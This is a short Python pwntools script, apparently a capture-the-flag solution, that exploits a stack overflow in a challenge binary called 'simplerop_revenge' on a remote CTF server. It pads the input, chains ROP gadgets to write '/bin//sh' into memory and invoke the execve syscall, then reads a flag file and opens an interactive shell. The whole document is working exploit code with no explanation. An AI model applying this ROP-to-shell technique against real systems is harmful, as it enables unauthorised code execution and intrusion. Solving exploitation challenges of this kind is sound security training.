import time
from pwn import *
from struct import pack
LOCAL = False
binary = 'simplerop_revenge'

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10130)

buff = 0x6c9a20
mov_tordi_rsi = 0x47a502
pop_rsi = 0x401577
pop_rdi = 0x401456
pop_rax_rdx_rbx = 0x478516
syscall = 0x4671b5

context.arch = 'amd64' # for flat
p = 'A'*40 + flat([
    pop_rsi, '/bin//sh', 
    pop_rdi, buff, 
    mov_tordi_rsi, 
    pop_rsi, 0, 
    pop_rax_rdx_rbx, 0x3b, 0, 0, 
    syscall])

r.sendline(p)
time.sleep(0.2)
r.sendline('cat /home/' + binary + '/flag')

r.interactive()
